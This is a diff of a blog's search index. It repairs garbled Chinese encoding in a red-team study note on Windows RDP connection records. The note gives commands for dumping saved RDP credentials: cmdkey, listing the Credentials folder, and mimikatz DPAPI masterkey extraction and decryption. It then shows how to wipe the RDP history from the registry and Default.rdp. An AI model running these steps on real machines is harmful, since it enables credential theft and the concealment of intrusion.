@@ -930,87 +930,87 @@
       </tags>
   </entry>
   <entry>
-    <title>��������͸ѧϰ�ʼǡ�05����ȡWinodws��Զ�����Ӽ�¼</title>
+    <title>【内网渗透学习笔记】05、获取Winodws的远程连接记录</title>
     <url>/2021/04/07/intranet05/</url>
-    <content><![CDATA[<h2 id="j������"><a href="#j������" class="headerlink" title="ǰ������"></a>ǰ������</h2><blockquote>
-<p>��ʹ��mstsc���ӵ�ʱ�򣬹���Ա��ѡ���Զ������������ӵ�ѡ��</p>
+    <content><![CDATA[<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><blockquote>
+<p>在使用mstsc连接的时候，管理员勾选了自动保存密码连接的选项</p>
 </blockquote>
-<h2 id="���Զ������������ʷ��¼"><a href="#���Զ������������ʷ��¼" class="headerlink" title="���Զ������������ʷ��¼"></a>���Զ������������ʷ��¼</h2><ul>
-<li>��õ�ǰ�û�����ʷ��¼</li>
+<h2 id="获得远程桌面连接历史记录"><a href="#获得远程桌面连接历史记录" class="headerlink" title="获得远程桌面连接历史记录"></a>获得远程桌面连接历史记录</h2><ul>
+<li>获得当前用户的历史记录</li>
 </ul>
 <blockquote>
-<p>ע��� <code>HKCU:\Software\Microsoft\Terminal Server Client\Servers</code></p>
+<p>注册表 <code>HKCU:\Software\Microsoft\Terminal Server Client\Servers</code></p>
 </blockquote>
-<p>ÿ��ע�������������ӵķ�������ַ����ֵ<code>UsernameHine</code>��Ӧ��½�û���</p>
+<p>每个注册表的项保存着连接的服务器地址，键值<code>UsernameHine</code>对应登陆用户名</p>
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140054423.png" alt="image-20210407140054423"></p>
-<h2 id="���Զ���������ӵ�����"><a href="#���Զ���������ӵ�����" class="headerlink" title="���Զ���������ӵ�����"></a>���Զ���������ӵ�����</h2><ul>
-<li>�鿴����������Ӽ�¼</li>
+<h2 id="获得远程桌面连接的密码"><a href="#获得远程桌面连接的密码" class="headerlink" title="获得远程桌面连接的密码"></a>获得远程桌面连接的密码</h2><ul>
+<li>查看计算机的连接记录</li>
 </ul>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list	</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140453363.png" alt="image-20210407140453363"></p>
 <ul>
-<li>���ұ��ص�֤��</li>
+<li>查找本地的证书</li>
 </ul>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140601500.png" alt="image-20210407140601500"></p>
 <ul>
-<li>ʹ��<code>mimikatz</code></li>
+<li>使用<code>mimikatz</code></li>
 </ul>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\<span class="number">7</span>AAD<span class="number">155</span>F<span class="number">4888</span>E<span class="number">9</span>DB<span class="number">9</span>D<span class="number">7</span>FE<span class="number">4</span>C<span class="number">235728</span>F<span class="number">8</span>C</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140830258.png" alt="image-20210407140830258"></p>
 <blockquote>
-<p>��<code>guimasterkey</code>������</p>
+<p>把<code>guimasterkey</code>记下来</p>
 </blockquote>
 <ul>
-<li>ʹ�� <code>::dpapi</code></li>
+<li>使用 <code>::dpapi</code></li>
 </ul>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407141038260.png" alt="image-20210407141038260"></p>
 <blockquote>
-<p>�������Ǹոյ�<code>guimasterkey</code>�õ�<code>MasterKey</code></p>
+<p>根据我们刚刚的<code>guimasterkey</code>得到<code>MasterKey</code></p>
 </blockquote>
 <ul>
-<li>���Ϳ��԰����������</li>
+<li>最后就可以把密码解密了</li>
 </ul>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz dpapi::cred /<span class="keyword">in</span>:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\<span class="number">7</span>AAD155F4888E9DB9D7FE4C235728F8C /masterkey:<span class="number">2</span>a1142391cf8bdacf5d93d267f0b8c8ebcf2016a37c5da0efe20b45c5a31b4f91cc4f3438af5ce969f3ac42a3d5e70b15e94df927b457a6c1647c2ce96dd4819</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142104997.png" alt="image-20210407142104997"></p>
-<h2 id="��ע�����ɾ��RDP���ӻ���"><a href="#��ע�����ɾ��RDP���ӻ���" class="headerlink" title="��ע�����ɾ��RDP���ӻ���"></a>��ע�����ɾ��RDP���ӻ���</h2><ul>
-<li>����(regedit.exe)����<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client</code> ;</li>
+<h2 id="从注册表中删除RDP连接缓存"><a href="#从注册表中删除RDP连接缓存" class="headerlink" title="从注册表中删除RDP连接缓存"></a>从注册表中删除RDP连接缓存</h2><ul>
+<li>运行(regedit.exe)并到<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client</code> ;</li>
 </ul>
 <blockquote>
-<p>��Ҫɾ������ע����<code>Ĭ��</code>���洢�����10��RDP���Ӽ�¼���ͷ�����(�����������ڵ�½��RDP���������û����б�)</p>
+<p>需要删除两个注册表项：<code>默认</code>（存储的最近10个RDP连接记录）和服务器(包含所有用于登陆的RDP服务器和用户名列表)</p>
 </blockquote>
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142745267.png" alt="image-20210407142745267"></p>
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142834238.png" alt="image-20210407142834238"></p>
 <blockquote>
-<p>Ϊ���������RDP���Ӻͱ�����û�����ʷ��¼���������������ע���������ݡ�ɾ������ServersȻ�����´�����</p>
+<p>为了清除所有RDP连接和保存的用户名历史记录，必须清除服务器注册表项的内容。删除整个Servers然后重新创建。</p>
 </blockquote>
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142952206.png" alt="image-20210407142952206"></p>
 <ul>
-<li>����Ĭ�ϵ�RDP�����ļ����������µ�RDP�Ự��Ϣ��ɾ��- <code>Default.rdp</code></li>
+<li>最后把默认的RDP连接文件（包含最新的RDP会话信息）删除- <code>Default.rdp</code></li>
 </ul>
 <blockquote>
-<p>Ĭ����DocumentĿ¼����������</p>
+<p>默认在Document目录中隐藏起来</p>
 </blockquote>
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407143207075.png" alt="image-20210407143207075"></p>
 <blockquote>
-<p>ɾ��</p>
+<p>删除</p>
 </blockquote>
 <p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407143445878.png" alt="image-20210407143445878"></p>
 ]]></content>
       <categories>
-        <category>����ѧϰ�ʼ�</category>
+        <category>内网学习笔记</category>
       </categories>
       <tags>
+        <tag>红队</tag>
+        <tag>学习笔记</tag>
+        <tag>内网渗透</tag>
         <tag>mstsc</tag>
-        <tag>���</tag>
-        <tag>ѧϰ�ʼ�</tag>
-        <tag>������͸</tag>
       </tags>
   </entry>
   <entry>
